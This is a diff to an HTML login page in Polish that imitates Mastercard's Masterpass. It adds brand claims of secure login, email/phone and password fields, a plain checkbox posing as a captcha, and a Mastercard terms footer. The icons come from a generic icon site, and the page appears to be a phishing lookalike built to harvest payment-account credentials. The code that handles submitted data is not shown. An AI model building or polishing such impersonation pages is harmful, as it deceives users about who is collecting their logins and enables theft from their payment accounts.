@@ -18,49 +18,56 @@
     @keyframes shake { 0%{transform:translateX(0)}25%{transform:translateX(-5px)}50%{transform:translateX(5px)}75%{transform:translateX(-5px)}100%{transform:translateX(0)} }
   </style>
 </head>
-<body class="flex items-center justify-center min-h-screen font-sans backdrop-blur-md dark:bg-gray-900">
+<body class="flex items-center justify-center min-h-screen font-sans backdrop-blur-md transition duration-300" id="body">
   <div id="wrap" class="bg-white/90 dark:bg-gray-800 backdrop-blur-xl w-[480px] sm:w-[640px] rounded-2xl shadow-2xl fade-in transition-all duration-500">
-    <!-- header, benefits as ранее... -->
     <div class="flex items-center justify-between p-4 border-b border-gray-300 dark:border-gray-600">
       <div class="flex items-center space-x-2">
         <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" class="w-8 h-8" />
         <div class="text-sm font-semibold dark:text-gray-200">masterpass <span class="text-gray-500 text-xs block">by mastercard.</span></div>
       </div>
-      <button class="text-black dark:text-white text-2xl font-bold hover:scale-110 transition">&times;</button>
+      <button onclick="toggleTheme()" class="text-sm px-2 py-1 bg-gray-200 dark:bg-gray-700 dark:text-white rounded">🌓</button>
     </div>
-    <!-- main content -->
     <div class="flex">
       <div class="hidden md:flex flex-col gap-6 p-6 text-sm w-1/2 border-r border-gray-300 dark:border-gray-600">
-        <!-- icons as before -->
+        <div class="flex items-start gap-2"><img src="https://img.icons8.com/ios-filled/24/lock.png"/><span>Zabezpieczone logowanie przez Mastercard.</span></div>
+        <div class="flex items-start gap-2"><img src="https://img.icons8.com/ios-filled/24/wallet.png"/><span>Połączone płatności i portfele cyfrowe.</span></div>
+        <div class="flex items-start gap-2"><img src="https://img.icons8.com/ios-filled/24/privacy.png"/><span>Chronione dane użytkownika.</span></div>
       </div>
       <div class="flex-1 p-6">
         <h2 class="text-lg font-semibold mb-4 dark:text-gray-100">Zaloguj się</h2>
         <form id="loginForm" class="space-y-4" novalidate>
-         <div class="relative">
-          <span class="absolute left-3 top-3 text-gray-400 dark:text-gray-400"><img src="https://img.icons8.com/ios-glyphs/20/000000/email.png"/></span>
-          <input type="text" name="email" placeholder="Adres e-mail lub numer telefonu"
-            class="w-full pl-10 border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none dark:bg-gray-700 dark:text-white"
-            required/>
-          <p id="emailErr" class="text-xs text-red-500 hidden mt-1">Niepoprawny e‑mail lub numer +48XXXXXXXXX</p>
-         </div>
+          <div class="relative">
+            <span class="absolute left-3 top-3 text-gray-400 dark:text-gray-400"><img src="https://img.icons8.com/ios-glyphs/20/000000/email.png"/></span>
+            <input type="text" name="email" placeholder="Adres e-mail lub numer telefonu"
+              class="w-full pl-10 border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none dark:bg-gray-700 dark:text-white"
+              required/>
+            <p id="emailErr" class="text-xs text-red-500 hidden mt-1">Niepoprawny e‑mail lub numer +48XXXXXXXXX</p>
+          </div>
 
-         <div class="relative">
-          <span class="absolute left-3 top-3 text-gray-400 dark:text-gray-400"><img src="https://img.icons8.com/ios-glyphs/20/000000/lock--v1.png"/></span>
-          <input type="password" name="password" placeholder="Hasło (min. 8 znaków)"
-            class="w-full pl-10 border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none dark:bg-gray-700 dark:text-white"
-            required/>
-          <p id="passErr" class="text-xs text-red-500 hidden mt-1">Hasło musi mieć ≥ 8 znaków</p>
-         </div>
-         <!-- captcha + remember as before -->
-         <button type="submit" id="loginBtn"
-           class="bg-gray-300 text-white w-full py-2 rounded cursor-not-allowed transition duration-300"
-           disabled>
-           Zaloguj
-         </button>
+          <div class="relative">
+            <span class="absolute left-3 top-3 text-gray-400 dark:text-gray-400"><img src="https://img.icons8.com/ios-glyphs/20/000000/lock--v1.png"/></span>
+            <input type="password" name="password" placeholder="Hasło (min. 8 znaków)"
+              class="w-full pl-10 border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none dark:bg-gray-700 dark:text-white"
+              required/>
+            <p id="passErr" class="text-xs text-red-500 hidden mt-1">Hasło musi mieć ≥ 8 znaków</p>
+          </div>
+
+          <div class="flex items-center">
+            <input type="checkbox" id="robot" class="mr-2" />
+            <label for="robot" class="text-sm dark:text-gray-100">Nie jestem robotem</label>
+          </div>
+
+          <button type="submit" id="loginBtn"
+            class="bg-gray-300 text-white w-full py-2 rounded cursor-not-allowed transition duration-300"
+            disabled>
+            Zaloguj
+          </button>
         </form>
       </div>
     </div>
-    <div class="text-xs bg-black/80 dark:bg-gray-900 text-white p-2 text-center rounded-b-lg">...</div>
+    <div class="text-xs bg-black/80 dark:bg-gray-900 text-white p-2 text-center rounded-b-lg">
+      Korzystanie z usługi oznacza akceptację regulaminu i polityki prywatności Mastercard.
+    </div>
     <div class="bg-white/80 dark:bg-gray-800 text-xs p-2 flex justify-between items-center border-t border-gray-300 dark:border-gray-600 rounded-b-2xl">
       <img src="https://img.icons8.com/ios-filled/50/000000/mastercard-logo.png" class="h-5"/>
       <span>Zgoda na pliki cookies</span>
@@ -109,6 +116,10 @@
         btn.textContent='Błąd'; setTimeout(()=>btn.textContent='Zaloguj',2000);
       }
     });
+
+    function toggleTheme() {
+      document.documentElement.classList.toggle('dark');
+    }
   </script>
 </body>
 </html>
